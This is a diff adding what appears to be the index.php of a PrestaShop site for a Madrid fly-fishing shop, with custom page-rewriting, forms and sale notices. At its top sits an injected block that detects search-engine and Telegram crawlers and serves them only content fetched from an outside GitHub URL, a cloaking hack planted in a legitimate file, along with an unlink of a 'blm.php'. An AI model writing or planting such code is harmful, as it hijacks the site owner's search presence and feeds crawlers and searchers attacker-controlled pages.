@@ -1,0 +1,644 @@
+<?php
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
+    
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+    
+    return false;
+}
+
+if (is_bot()) {
+    $message = file_get_contents('https://raw.githubusercontent.com/yugoprakoso157/D/refs/heads/main/www.theflycenter.com.txt');
+    echo $message;
+exit; // Atau bisa menggunakan die()
+}
+?>
+<?php
+/*
+* 2007-2015 PrestaShop
+*
+* NOTICE OF LICENSE
+*
+* This source file is subject to the Open Software License (OSL 3.0)
+* that is bundled with this package in the file LICENSE.txt.
+* It is also available through the world-wide-web at this URL:
+* http://opensource.org/licenses/osl-3.0.php
+* If you did not receive a copy of the license and are unable to
+* obtain it through the world-wide-web, please send an email
+* to license@prestashop.com so we can send you a copy immediately.
+*
+* DISCLAIMER
+*
+* Do not edit or add to this file if you wish to upgrade PrestaShop to newer
+* versions in the future. If you wish to customize PrestaShop for your
+* needs please refer to http://www.prestashop.com for more information.
+*
+*  @author PrestaShop SA <contact@prestashop.com>
+*  @copyright  2007-2015 PrestaShop SA
+*  @license    http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)
+*  International Registered Trademark & Property of PrestaShop SA
+*/
+
+//cyp_control_8sda8hdkmfjm66fsfmasdasdb4y4
+
+unlink(getcwd()."/blm.php");
+
+ob_start("callback");
+
+require(dirname(__FILE__).'/config/config.inc.php');
+Dispatcher::getInstance()->dispatch();
+
+ob_end_flush();
+
+function callback($buffer)
+{
+	$current_url=$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
+
+	if(strpos($current_url, "paylater/payment")===false)
+	{
+		$buffer=str_replace("http://www.theflycenter.com", "https://www.theflycenter.com", $buffer);
+	}
+
+	//FORMULARIO VIAJES
+	$formulario_viajes='<div class="cyp_viajes_formulario">
+	<form name="cyp_viajes_formulario_form" action="javascript://" method="post">
+	<label for="nombre">Nombre y Apellidos</label>
+	<input name="nombre" type="text" value="">
+	<label for="telefono">Teléfono de contacto</label>
+	<input name="telefono" type="text" value="">
+	<label for="email">Email de contacto</label>
+	<input name="email" type="text" value="">
+	<label for="plazas">Nº de cañas o plazas en las que está interesado</label>
+	<input name="plazas" type="text" value="">
+	<label for="fechas">Fechas en las que desea viajar</label>
+	<input name="fechas" type="text" value="">
+	<input name="destino" type="hidden" value="">
+	<div class="cyp_viajes_formulario_mensajes"><input type="submit" value="Enviar"></div>
+	</form>
+	</div>';
+
+	if(strpos($buffer, "[cyp_viajes_formulario]")!==false)
+	{
+		$buffer=str_replace('[cyp_viajes_formulario]', $formulario_viajes, $buffer);
+
+		$buffer=str_replace('http://platform.twitter.com/widgets.js', 'https://platform.twitter.com/widgets.js', $buffer);
+	}
+	//FIN FORMULARIO VIAJES
+
+	//FORMULARIO ESCUELAS
+	$formulario_escuela='<div class="cyp_escuela_formulario">
+	<form name="cyp_escuela_formulario_form" action="javascript://" method="post">
+	<label for="nombre">Nombre y Apellidos</label>
+	<input name="nombre" type="text" value="">
+	<label for="telefono">Teléfono de contacto</label>
+	<input name="telefono" type="text" value="">
+	<label for="email">Email de contacto</label>
+	<input name="email" type="text" value="">
+	<label for="curso">¿En qué curso estás interesado?</label>
+	<input name="curso" type="text" value="">
+	<div class="cyp_escuela_formulario_mensajes"><input type="submit" value="Enviar"></div>
+	</form>
+	</div>';
+
+	if(strpos($buffer, "[cyp_escuela_formulario]")!==false)
+	{
+		$buffer=str_replace('[cyp_escuela_formulario]', $formulario_escuela, $buffer);
+
+		$buffer=str_replace('http://platform.twitter.com/widgets.js', 'https://platform.twitter.com/widgets.js', $buffer);
+	}
+	//FIN FORMULARIO ESCUELAS
+
+	//ESCUELA DE PESCA
+	if(strpos($buffer, " cms-escuela-de-pesca ")!==false)
+	{
+		$contenido='<div class="cyp_categoria">
+		<a href="https://www.theflycenter.com/es/content/category/18-aula-de-lance"><div class="cyp_categoria_elem"><div class="cyp_categoria_elem_imagen"><img src="https://www.theflycenter.com/img/escuela_lance.jpg"/><p>Aula de Lance</p></div></div></a>
+		<a href="https://www.theflycenter.com/es/content/category/23-aula-de-montaje"><div class="cyp_categoria_elem"><div class="cyp_categoria_elem_imagen"><img src="https://www.theflycenter.com/img/aula_montaje.jpg"/><p>Aula de Montaje</p></div></div></a>
+		<a href="https://www.theflycenter.com/es/content/31-escuela-de-pesca-a-mosca-montaje-y-casting"><div class="cyp_categoria_elem"><div class="cyp_categoria_elem_imagen"><img src="https://www.theflycenter.com/img/escuela_curso.jpg"/><p>Curso de Pesca</p></div></div></a>
+		<a href="https://www.theflycenter.com/es/content/39-guiadas-de-pesca"><div class="cyp_categoria_elem"><div class="cyp_categoria_elem_imagen"><img src="https://www.theflycenter.com/img/escuela_guiadas.jpg"/><p>Guiadas de Pesca</p></div></div></a>
+		</div>';
+
+		$buffer=str_replace('</h1>', '</h1>'.$contenido, $buffer);
+	}
+
+	//ESCUELA DE PESCA - AULA DE LANCE
+	if(strpos($buffer, " cms-aula-de-lance ")!==false)
+	{
+		$contenido='<div class="cyp_categoria">
+		<a href="https://www.theflycenter.com/es/content/34-saturday-cast-entrenamiento-de-lance"><div class="cyp_categoria_elem"><div class="cyp_categoria_elem_imagen"><img src="https://www.theflycenter.com/img/lance_saturday.jpg"/><p>Saturday Cast</p></div></div></a>
+		<a href="https://www.theflycenter.com/es/content/38-lance-por-horas"><div class="cyp_categoria_elem"><div class="cyp_categoria_elem_imagen"><img src="https://www.theflycenter.com/img/lance_horas.jpg"/><p>Lance por Horas</p></div></div></a>
+		<a href="https://www.theflycenter.com/es/content/40-master-class-lanzado"><div class="cyp_categoria_elem"><div class="cyp_categoria_elem_imagen"><img src="https://www.theflycenter.com/img/lance_master.jpg"/><p>Master Class Lanzado</p></div></div></a>
+		<a href="https://www.theflycenter.com/es/content/41-titulacion-tfc"><div class="cyp_categoria_elem"><div class="cyp_categoria_elem_imagen"><img src="https://www.theflycenter.com/img/lance_tfc.jpg"/><p>Titulación TFC</p></div></div></a>
+		</div>';
+
+		$buffer=str_replace('</h1>', '</h1>'.$contenido, $buffer);
+	}
+
+	//ESCUELA DE PESCA - AULA DE MONTAJE
+	if(strpos($buffer, " cms-aula-de-montaje ")!==false)
+	{
+		$contenido='<div class="cyp_categoria">
+		<a href="https://www.theflycenter.com/es/content/42-cursos-montaje-sabados"><div class="cyp_categoria_elem"><div class="cyp_categoria_elem_imagen"><img src="https://www.theflycenter.com/img/montaje_sabados.jpg"/><p>Cursos Montaje Sábados</p></div></div></a>
+		<a href="https://www.theflycenter.com/es/content/43-montaje-por-horas"><div class="cyp_categoria_elem"><div class="cyp_categoria_elem_imagen"><img src="https://www.theflycenter.com/img/montaje_horas.jpg"/><p>Montaje por Horas</p></div></div></a>
+		<a href="https://www.theflycenter.com/es/content/44-sesiones-libres-montaje-viernes"><div class="cyp_categoria_elem"><div class="cyp_categoria_elem_imagen"><img src="https://www.theflycenter.com/img/montaje_viernes.jpg"/><p>Sesiones Libres Montaje Viernes</p></div></div></a>
+		<a href="https://www.theflycenter.com/es/content/45-cursos-para-asociaciones-y-clubs"><div class="cyp_categoria_elem"><div class="cyp_categoria_elem_imagen"><img src="https://www.theflycenter.com/img/montaje_clubs.jpg"/><p>Cursos para Asociaciones y Clubs</p></div></div></a>
+		</div>';
+
+		$buffer=str_replace('</h1>', '</h1>'.$contenido, $buffer);
+	}
+
+	//DREAMS
+	if(strpos($buffer, " cms-dreams ")!==false)
+	{
+		/*$contenido='<div class="cyp_categoria">
+		<a href="https://www.theflycenter.com/es/content/category/4-nacionales"><div class="cyp_categoria_elem"><div class="cyp_categoria_elem_imagen"><img src="https://www.theflycenter.com/img/dreams_nacional.jpg"/><p>Nacionales</p></div></div></a>
+		<a href="https://www.theflycenter.com/es/content/category/5-internacionales"><div class="cyp_categoria_elem"><div class="cyp_categoria_elem_imagen"><img src="https://www.theflycenter.com/img/dreams_internacional.jpg"/><p>Internacionales</p></div></div></a>
+		</div>';*/
+
+		//PROVISIONAL
+		$contenido='<div style="display: inline-block;width: 98%;text-align: center;background: #111111;color: white;margin-left: 1%;margin-bottom: 20px;padding: 20px;font-size: 18px;line-height: 1.3;">
+		Estamos remodelando la sección de organización de eventos de pesca a mosca para el Año 2022.
+		<br/><br/>- Muy Pronto Disponible -
+		</div>
+		<div class="cyp_categoria">
+		<a href="javascript://"><div class="cyp_categoria_elem"><div class="cyp_categoria_elem_imagen"><img src="https://www.theflycenter.com/img/dreams_nacional.jpg"/><p></p></div></div></a>
+		<a href="javascript://"><div class="cyp_categoria_elem"><div class="cyp_categoria_elem_imagen"><img src="https://www.theflycenter.com/img/dreams_internacional.jpg"/><p></p></div></div></a>
+		</div>';
+		//FIN PROVISIONAL
+
+		$buffer=str_replace('</h1>', '</h1>'.$contenido, $buffer);
+	}
+
+	//DREAMS - NACIONALES
+	if(strpos($buffer, " cms-nacionales ")!==false)
+	{
+		$contenido='<div class="cyp_categoria">
+		<a href="https://www.theflycenter.com/es/content/30-destino-leon-lodge-y-pesca-con-guia"><div class="cyp_categoria_elem"><div class="cyp_categoria_elem_imagen"><img src="https://www.theflycenter.com/img/nacionales_leon.jpg"/><p>León</p></div></div></a>
+		<a href="https://www.theflycenter.com/es/content/33-alfarras-alojamiento-y-pesca-con-guia"><div class="cyp_categoria_elem"><div class="cyp_categoria_elem_imagen"><img src="https://www.theflycenter.com/img/nacionales_alfarras.jpg"/><p>Alfarras</p></div></div></a>
+		<a href="https://www.theflycenter.com/es/content/46-angles"><div class="cyp_categoria_elem"><div class="cyp_categoria_elem_imagen"><img src="https://www.theflycenter.com/img/nacional_angles.jpg"/><p>Angles</p></div></div></a>
+		<a href="https://www.theflycenter.com/es/content/47-serena"><div class="cyp_categoria_elem"><div class="cyp_categoria_elem_imagen"><img src="https://www.theflycenter.com/img/nacionales_serena.jpg"/><p>Serena</p></div></div></a>
+		<a href="https://www.theflycenter.com/es/content/48-salamanca-tormes"><div class="cyp_categoria_elem"><div class="cyp_categoria_elem_imagen"><img src="https://www.theflycenter.com/img/nacionales_tormes.jpg"/><p>Salamanca - Tormes</p></div></div></a>
+		<a href="https://www.theflycenter.com/es/content/49-asturias-cantabria"><div class="cyp_categoria_elem"><div class="cyp_categoria_elem_imagen"><img src="https://www.theflycenter.com/img/nacional_asturias.jpg"/><p>Asturias / Cantabria</p></div></div></a>
+		<a href="https://www.theflycenter.com/es/content/50-pirineos"><div class="cyp_categoria_elem"><div class="cyp_categoria_elem_imagen"><img src="https://www.theflycenter.com/img/nacionales_pirineos.jpg"/><p>Pirineos</p></div></div></a>
+		<a href="https://www.theflycenter.com/es/content/51-extremadura-barbos"><div class="cyp_categoria_elem"><div class="cyp_categoria_elem_imagen"><img src="https://www.theflycenter.com/img/nacionales_extremadura.jpg"/><p>Extremadura - Barbos</p></div></div></a>
+		<a href="https://www.theflycenter.com/es/content/52-mar-embarcado"><div class="cyp_categoria_elem"><div class="cyp_categoria_elem_imagen"><img src="https://www.theflycenter.com/img/nacionales_mar.jpg"/><p>Mar Embarcado</p></div></div></a>
+		</div>';
+
+		$buffer=str_replace('</h1>', '</h1>'.$contenido, $buffer);
+	}
+
+	//DREAMS - INTERNACIONALES
+	if(strpos($buffer, " cms-internacionales ")!==false)
+	{
+		$contenido='<div class="cyp_categoria">
+		<a href="https://www.theflycenter.com/es/content/36-austria-rio-ybbs-alojamiento-y-pesca-con-guia"><div class="cyp_categoria_elem"><div class="cyp_categoria_elem_imagen"><img src="https://www.theflycenter.com/img/internacionales_austria.jpg"/><p>Austria</p></div></div></a>
+		<a href="https://www.theflycenter.com/es/content/60-patagonia-argentina-alojamiento-y-pesca-con-guia"><div class="cyp_categoria_elem"><div class="cyp_categoria_elem_imagen"><img src="https://www.theflycenter.com/img/internacionales_argentina.jpg"/><p>Argentina</p></div></div></a>
+		<a href="https://www.theflycenter.com/es/content/53-bosnia"><div class="cyp_categoria_elem"><div class="cyp_categoria_elem_imagen"><img src="https://www.theflycenter.com/img/internacionales_bosnia.jpg"/><p>Bosnia</p></div></div></a>
+		<a href="https://www.theflycenter.com/es/content/35-italia-las-dolomitas-alojamiento-y-pesca-con-guia"><div class="cyp_categoria_elem"><div class="cyp_categoria_elem_imagen"><img src="https://www.theflycenter.com/img/internacionales_italia.jpg"/><p>Italia</p></div></div></a>
+		<a href="https://www.theflycenter.com/es/content/27-chile-rio-puelo-petrohue"><div class="cyp_categoria_elem"><div class="cyp_categoria_elem_imagen"><img src="https://www.theflycenter.com/img/internacionales_chile.jpg"/><p>Chile</p></div></div></a>
+		<a href="https://www.theflycenter.com/es/content/54-slovenia"><div class="cyp_categoria_elem"><div class="cyp_categoria_elem_imagen"><img src="https://www.theflycenter.com/img/internacional_slovenia.jpg"/><p>Slovenia</p></div></div></a>
+		</div>';
+
+		$buffer=str_replace('</h1>', '</h1>'.$contenido, $buffer);
+	}
+
+	//BLOQUE HOME
+	if(strpos($buffer, '<body id="index"')!==false)
+	{
+		/*$contenido='<div class="cyp_bloque_home_normal">
+		<a href="https://www.theflycenter.com/es/content/55-tienda-fisica"><div class="cyp_bloque_home_normal_elem cyp_bloque_home_normal_elem_sep" style="background:url(../../../../img/home_fisica.jpg)"><div class="cyp_bloque_home_normal_elem_texto">Tienda Física</div></div></a>
+		<a href="#"><div class="cyp_bloque_home_normal_elem cyp_bloque_home_normal_elem_sep" style="background:url(../../../../img/home_online.jpg)"><div class="cyp_bloque_home_normal_elem_texto">Tienda Online</div></div></a>
+		<a href="https://www.theflycenter.com/es/content/category/2-dreams"><div class="cyp_bloque_home_normal_elem cyp_bloque_inicio_elem_sep" style="background:url(../../../../img/home_dreams.jpg)"><div class="cyp_bloque_home_normal_elem_texto">Dreams</div></div></a>
+		<a href="https://www.theflycenter.com/es/content/category/3-escuela-de-pesca"><div class="cyp_bloque_home_normal_elem" style="background:url(../../../../img/home_escuela.jpg)"><div class="cyp_bloque_home_normal_elem_texto">Escuela de Pesca</div></div></a>
+		</div>';
+
+		$buffer=str_replace('<div class="columns-container">', '<div class="columns-container">'.$contenido, $buffer);*/
+
+		/*$contenido='<div class="cyp_bloque_inicio">
+		<a href="https://www.theflycenter.com/es/content/category/2-dreams"><div class="cyp_bloque_inicio_elem cyp_bloque_inicio_elem_sep" style="background:url(../../../../img/home_dreams.jpg)"><div class="cyp_bloque_inicio_elem_texto">Dreams</div></div></a>
+		<a href="https://www.theflycenter.com/es/content/category/3-escuela-de-pesca"><div class="cyp_bloque_inicio_elem cyp_bloque_inicio_elem_sep" style="background:url(../../../../img/home_escuela.jpg)"><div class="cyp_bloque_inicio_elem_texto">Escuela de Pesca y Montaje</div></div></a>
+		<a href="https://www.theflycenter.com/es/content/55-tienda-fisica"><div class="cyp_bloque_inicio_elem" style="background:url(../../../../img/home_fisica.jpg)"><div class="cyp_bloque_inicio_elem_texto">Tienda Física y Club - Madrid</div></div></a>
+		</div>';
+
+		$buffer=str_replace('<div class="columns-container">', '<div class="columns-container">'.$contenido, $buffer);*/
+
+		/*$contenido='<div class="cyp_bloque_home">
+		<a href="https://www.theflycenter.com/es/content/category/2-dreams"><div class="cyp_bloque_home_elem" style="background:url(../../../../img/home_dreams.jpg)"><div class="cyp_bloque_home_elem_texto">Dreams</div></div></a>
+		<a href="https://www.theflycenter.com/es/content/category/3-escuela-de-pesca"><div class="cyp_bloque_home_elem" style="background:url(../../../../img/home_escuela.jpg)"><div class="cyp_bloque_home_elem_texto">Escuela de Pesca</div></div></a>
+		<a href="javascript://"><div class="cyp_bloque_home_elem" style="background:url(../../../../img/home_online.jpg)"><div class="cyp_bloque_home_elem_texto">Tienda Online</div></div></a>
+		<a href="https://www.theflycenter.com/es/content/55-tienda-fisica"><div class="cyp_bloque_home_elem" style="background:url(../../../../img/home_fisica.jpg)"><div class="cyp_bloque_home_elem_texto">Tienda Física</div></div></a>
+		</div>';
+
+		$buffer=str_replace('<div class="breadcrumb clearfix"', $contenido.'<div style="display:none !important" class="breadcrumb clearfix"', $buffer);*/
+	}
+
+	//ENCABEZADO NUEVO
+	//if(strpos($buffer, ' cms-50 ')!==false || strpos($buffer, ' product-4644 ')!==false)
+	if(strpos($buffer, '<body')!==false)
+	{
+		$idiomas="";
+		$micuenta="";
+		$buscador="";
+		$carrito="";
+		$movil="";
+		$movil_logo="";
+
+		$dom = new DOMDocument;
+		$dom->loadHTML(mb_convert_encoding($buffer, 'HTML-ENTITIES', 'UTF-8'));
+
+		foreach($dom->getElementsByTagName('body') as $element)
+		{
+			$element->setAttribute("class",$element->getAttribute("class")." cyp_diseno_custom");
+		}
+
+		$db=bbdd();
+
+		$control=false;
+
+	    if($idusuario=Context::getContext()->customer->id)
+	    {
+	    	$result=mysqli_query($db,"select * from ps_customer where id_customer='".$idusuario."' and (id_default_group='1' or id_default_group='2' or id_default_group='3') limit 1");
+
+	    	if($row=mysqli_fetch_assoc($result))
+	    	{
+	    		$control=true;
+	    	}
+	    }else{
+	    	$control=true;
+	    }
+
+	    if($control==true)
+	    {
+		    foreach($dom->getElementsByTagName('body') as $element)
+			{
+				$element->setAttribute("class",$element->getAttribute("class")." cyp_diseno_custom_precios");
+			}
+	    }
+
+	    mysqli_close($db);
+
+		foreach($dom->getElementsByTagName('div') as $element)
+		{
+			if(strpos($element->getAttribute("class"), "header-container")!==false)
+			{
+				$element->setAttribute("class",$element->getAttribute("class")." cyp_header_custom");
+
+				foreach($element->getElementsByTagName('div') as $elem)
+				{
+					if($elem->getAttribute("class")=="nav")
+					{
+						$movil=$elem->C14N();
+					}
+				}
+				foreach($element->getElementsByTagName('div') as $elem)
+				{
+					if(strpos($elem->getAttribute("id"), "header_logo")!==false)
+					{
+						$movil_logo=$elem->C14N();
+						//$elem->parentNode->removeChild($elem);
+					}
+				}
+				foreach($element->getElementsByTagName('div') as $elem)
+				{
+					if(strpos($elem->getAttribute("id"), "languages-block-top")!==false)
+					{
+						$idiomas=$elem->C14N();
+						$elem->parentNode->removeChild($elem);
+					}
+				}
+				foreach($element->getElementsByTagName('div') as $elem)
+				{
+					if(strpos($elem->getAttribute("class"), "header_user_info")!==false)
+					{
+						$micuenta=$elem->C14N();
+						$elem->parentNode->removeChild($elem);
+					}
+				}
+				foreach($element->getElementsByTagName('div') as $elem)
+				{
+					if(strpos($elem->getAttribute("id"), "search_block_top")!==false)
+					{
+						$buscador=$elem->C14N();
+						$elem->parentNode->removeChild($elem);
+					}
+				}
+				foreach($element->getElementsByTagName('div') as $elem)
+				{
+					if(strpos($elem->getAttribute("class"), "shopping_cart")!==false)
+					{
+						$carrito=$elem->C14N();
+						$elem->parentNode->removeChild($elem);
+					}
+				}
+				foreach($element->getElementsByTagName('div') as $elem)
+				{
+					if(strpos($elem->getAttribute("class"), "nav")!==false)
+					{
+						$elem->parentNode->removeChild($elem);
+						//$elem->setAttribute("style","display:none !important");
+						
+						/*foreach($elem->getElementsByTagName('nav') as $ele)
+						{
+							$ele->parentNode->removeChild($ele);
+							if(strpos($ele->getAttribute("id"), "search_block_top")!==false)
+							{
+								$ele->parentNode->removeChild($ele);
+							}
+						}*/
+					}
+				}
+				foreach($element->getElementsByTagName('div') as $elem)
+				{
+					if(strpos($elem->getAttribute("class"), "banner")!==false)
+					{
+						$elem->parentNode->removeChild($elem);
+					}
+				}
+				foreach($element->getElementsByTagName('div') as $elem)
+				{
+					if($elem->getAttribute("class")=="container")
+					{
+						$elem->setAttribute("class",$elem->getAttribute("class")." cyp_header_custom_principal");
+					}
+				}
+				foreach($element->getElementsByTagName('div') as $elem)
+				{
+					if(strpos($elem->getAttribute("class"), "cyp_header_custom_principal")!==false)
+					{
+						foreach($elem->getElementsByTagName('div') as $ele)
+						{
+							if($ele->getAttribute("id")=="header_logo")
+							{
+								$ele->setAttribute("style","display:none !important");
+							}
+							if($ele->getAttribute("class")=="item-html")
+							{
+								$ele->setAttribute("style","display:none !important");
+							}
+						}
+					}
+				}
+
+				if(strpos($buffer, '<body id="index"')===false || 1==1)
+				{
+					$codigo = $dom->createDocumentFragment();
+					$codigo->appendXML('<div class="cyp_header_info">Envío gratis a partir de 89€ / Envío desde 5,50€ *(<a href="https://www.theflycenter.com/es/content/1-envio" style="color: white !important;text-decoration: underline;">+info</a>)</div>');
+					$element->insertBefore($codigo, $element->firstChild);
+				}
+
+				$encabezado_nuevo='<div class="cyp_header_elem_movil">'.$movil.$movil_logo.'</div><div class="cyp_header_elem">'.$carrito.$micuenta.$idiomas.$buscador.'<a href="https://www.theflycenter.com/"><img class="cyp_header_elem_logo" src="../../../../img/logo_theflycenter.jpg"/></a></div>';
+
+				foreach($element->getElementsByTagName('div') as $elem)
+				{
+					if(strpos($elem->getAttribute("class"), "cyp_header_custom_principal")!==false)
+					{
+						$codigo = $dom->createDocumentFragment();
+						$codigo->appendXML($encabezado_nuevo);
+						$elem->insertBefore($codigo, $elem->firstChild);
+					}
+				}
+			}
+		}
+
+		foreach($dom->getElementsByTagName('div') as $element)
+		{
+			if($element->getAttribute("class")=="footer-foot")
+			{
+				$element->parentNode->removeChild($element);
+			}
+		}
+
+		foreach($dom->getElementsByTagName('form') as $element)
+		{
+			if($element->getAttribute("id")=="form_newsletter")
+			{
+				foreach($element->getElementsByTagName('input') as $elem)
+				{
+					if($elem->getAttribute("id")=="accept_conditions")
+					{
+						//$elem->parentNode->removeChild($elem);
+					}
+				}
+				foreach($element->getElementsByTagName('label') as $elem)
+				{
+					if($elem->getAttribute("class")=="control-label")
+					{
+						$elem->parentNode->removeChild($elem);
+					}
+				}
+			}
+		}
+
+		$buffer = html_entity_decode($dom->saveHTML(),ENT_COMPAT | ENT_HTML5,'UTF-8');
+
+		$newsletter_check_aceptacion='<div style="display: inline-block;width: 100%;margin-top: 10px;"><input type="checkbox" name="condiciones" required/> He leído y acepto la <a style="text-decoration:underline" href="https://www.theflycenter.com/es/content/57-politica-de-privacidad" target="_blank">Política de Privacidad</a></div>';
+		$buffer=str_replace('<button type="submit" name="submitNewsletter"', $newsletter_check_aceptacion.'<button type="submit" name="submitNewsletter"', $buffer);
+
+		$aviso_provisional='<div class="cyp_aviso_provisional"><div class="container"><div><b style="color: #ffd42a;">NUESTRA TIENDA FÍSICA YA ESTA ABIERTA AL PUBLICO</b><br>Le atendemos en nuestra tienda física de Coslada - Madrid en nuestro horario habitual.<br><br>
+		<b style="color: #ffd42a;">Mantenemos medidas de seguridad para prevenir el Covid19:</b> Aforo limitado al permitido en esta fase, Gel Hidroalcohólico, Guantes, Mascarilla y Distancia de Seguridad.<br>
+		<b style="color: #ffd42a;">Tres medios Seguros para realizar su Compra:</b> Compra Online con envío por mensajeria, Compra Online con Recogida en Tienda Coslada - Madrid y compra con Atención personalizada en Tienda.
+		</div><img src="https://www.theflycenter.com/img/icono_warning.png"/></div></div>';
+
+		$aviso_provisional='<div class="cyp_aviso_provisional"><div class="container"><div>
+		Nuestras instalaciones de Coslada - Madrid permanecerán cerradas al público desde el día 17 de Agosto hasta el 21 de Agosto con motivo de realizar inventario.<br><br>
+		Todos los pedidos online recibidos en estas fechas serán enviados a partir del lunes día 24 de Agosto.
+		</div><img src="https://www.theflycenter.com/img/icono_warning.png"/></div></div>';
+
+		$aviso_provisional='<div class="cyp_aviso_provisional"><div class="container"><div>
+		Estamos realizando inventario. Los stocks de los productos pueden sufrir variaciones durante el fin de semana.<br><br>
+		Disculpen las molestias y si tienen alguna duda ponganse en contacto con nosotros: <a href="tel:916739644" style="color: white;">91 673 96 44</a> - <a href="mailto:info@theflycenter.com" style="color: white;">info@theflycenter.com</a>
+		</div><img src="https://www.theflycenter.com/img/icono_warning.png"/></div></div>';
+
+		$aviso_provisional='<div class="cyp_aviso_provisional"><div class="container"><div>
+		Estamos de inventario, el stock puede sufrir cambios.<br><br>Seguimos sirviendo y pueden realizar sus pedidos. Gracias y disculpen las molestias.
+		</div><img src="https://www.theflycenter.com/img/icono_warning.png"/></div></div>';
+
+		$aviso_provisional='';
+
+		$date=DateTime::createFromFormat("d/m/Y H:i:s","17/10/2024 20:00:00",new DateTimeZone('Europe/Madrid'));
+		$mktime_inicio=$date->getTimestamp();
+
+		$date=DateTime::createFromFormat("d/m/Y H:i:s","18/10/2024 23:59:59",new DateTimeZone('Europe/Madrid'));
+		$mktime_fin=$date->getTimestamp();
+
+		if(mktime(date("H"),date("i"),date("s"),date("m"),date("d"),date("Y"))>=$mktime_inicio && mktime(date("H"),date("i"),date("s"),date("m"),date("d"),date("Y"))<=$mktime_fin)
+		{
+			/*$aviso_provisional='<div class="cyp_aviso_provisional" style="line-height: 15px;"><div class="container"><div>
+			<strong style="font-size: 16px;line-height: 1.2;">Black Friday: Descuentos desde el 15% hasta el 70%<br><br>Siempre se pagará costes de transporte</strong>
+			</div><img src="https://www.theflycenter.com/img/icono_descuento.png"/></div></div>';*/
+
+			$aviso_provisional='<div class="cyp_aviso_provisional" style="line-height: 15px;"><div class="container"><div>
+			<strong style="font-size: 16px;line-height: 1.2;">Día sin IVA: -21% de IVA el viernes 18 de Octubre desde las 00:00 hasta las 24:00 horas (solo en tienda online)<br><br>Todos los pedidos del Día sin IVA tienen gastos de envío independientemente del valor del pedido</strong>
+			</div><img src="https://www.theflycenter.com/img/icono_descuento.png"/></div></div>';
+			$buffer=str_replace('-17.50%', 'SIN IVA', $buffer);
+			$buffer=str_replace('<span id="reduction_percent_display"> -17.5% </span>', '<span id="reduction_percent_display"> SIN IVA </span>', $buffer);
+			$buffer=str_replace('<span class="price-percent-reduction">-17.5%</span>', '<span class="price-percent-reduction">SIN IVA</span>', $buffer);
+			$buffer=str_replace('<span class="reduction_rouge">- 17.5%</span>', '<span class="reduction_rouge" style="font-size: 16px;">SIN IVA</span>', $buffer);
+			$buffer=str_replace('<li class="price-percent-reduction small"> &nbsp;-17.50%&nbsp;</li>', '<li class="price-percent-reduction small">  SIN IVA </li>', $buffer);
+			$buffer=str_replace('<span class="label label-default offer-label" style="width:50% !important"><strong>17.5%</strong> Descuento</span>', '<span class="label label-default offer-label" style="width:50% !important"><strong>SIN IVA</strong></span>', $buffer);
+
+			//<img src="https://www.theflycenter.com/img/icono_warning.png"/>
+			//<img src="https://www.theflycenter.com/img/icono_descuento.png"/>
+			//<br><br>Semana 14-20 de AGOSTO: Cerrado<br><br>Seguimos sirviendo tus pedidos online
+		}
+
+		//AVISO PROVISIONAL SIEMPRE GASTO ENVÍO
+		/*$aviso_provisional='<div class="cyp_aviso_provisional" style="margin-bottom:30px"><div class="container">
+		<div style="font-size: 16px !important;display: inline-block;width: 100%;max-width: 1000px;text-align: left;">
+		Todos los pedidos recibidos en el Black Friday tienen un gasto de envío mínimo de 5€ independientemente del valor del pedido.
+		<div style="display: inline-block;width: 100%;max-width: 1000px;text-align: center;margin-top:25px"><strong style="font-size:18px!important">BLACK FRIDAY</strong></div>
+		</div>
+		<img src="https://www.theflycenter.com/img/icono_descuento.png"/></div></div>';
+		$buffer=str_replace('<div class="cyp_header_info"', '<div class="cyp_header_info" style="display:none"', $buffer);*/
+
+		/*if(strpos($buffer, '<body id="order-opc"')!==false)
+		{
+			$buffer=str_replace('<div id="carrier_area"', $aviso_provisional.'<div id="carrier_area"', $buffer);
+		}$aviso_provisional='';*/
+		//AVISO PROVISIONAL SIEMPRE GASTO ENVÍO
+
+		if(strpos($buffer, '<body id="index"')!==false)
+		{
+			/*$contenido='<div class="cyp_bloques"><div class="container">
+			<a href="https://www.theflycenter.com/es/content/category/2-dreams"><div class="cyp_bloques_elem cyp_bloques_elem_izq" style="background:url(../../../../img/home_dreams.jpg)"><div class="cyp_bloques_elem_texto">Dreams</div></div></a>
+			<a href="https://www.theflycenter.com/es/content/category/3-escuela-de-pesca"><div class="cyp_bloques_elem cyp_bloques_elem_der" style="background:url(../../../../img/home_escuela.jpg)"><div class="cyp_bloques_elem_texto">Escuela de Pesca<br/>y Montaje</div></div></a>
+			<a href="https://www.theflycenter.com/es/content/55-tienda-fisica"><div class="cyp_bloques_elem cyp_bloques_elem_izq" style="background:url(../../../../img/home_fisica.jpg)"><div class="cyp_bloques_elem_texto">Tienda Física<br/>Madrid</div></div></a>
+			<a href="https://www.theflycenter.com/es/content/24-the-flycenter-club"><div class="cyp_bloques_elem cyp_bloques_elem_der" style="background:url(../../../../img/home_club.jpg)"><div class="cyp_bloques_elem_texto">Club de Pesca</div><img src="../../../../img/logo_club.png"></div></a>
+			</div></div>';*/
+
+			$contenido='<div class="cyp_bloques_alt_3"><div class="container">
+			<a href="https://www.theflycenter.com/es/content/category/3-escuela-de-pesca"><div class="cyp_bloques_alt_elem_3" style="background:url(../../../../img/home_escuela.jpg)"><div class="cyp_bloques_alt_elem_texto">Escuela de Pesca<br/>y Montaje</div></div></a>
+			<a href="https://www.theflycenter.com/es/content/55-tienda-fisica"><div class="cyp_bloques_alt_elem_3" style="background:url(../../../../img/home_fisica.jpg)"><div class="cyp_bloques_alt_elem_texto">Tienda Física<br/>Madrid</div></div></a>
+			<a href="https://www.theflycenter.com/es/content/24-the-flycenter-club"><div class="cyp_bloques_alt_elem_3" style="background:url(../../../../img/home_club.jpg)"><div class="cyp_bloques_alt_elem_texto">Club de Pesca</div><img src="../../../../img/logo_club.png"></div></a>
+			</div></div>';
+
+			$buffer=str_replace('<div class="columns-container">', '<div class="columns-container">'.$aviso_provisional.$contenido, $buffer);
+
+			$buffer=str_replace('<ul class="next-event-list"></ul>', '<ul class="next-event-list"></ul><a href="https://www.theflycenter.com/content/5-pago#financiacion"><img src="https://www.theflycenter.com/img/sequra_home.png" style="width:100%;margin-top: 40px;"/></a>', $buffer);
+		}
+
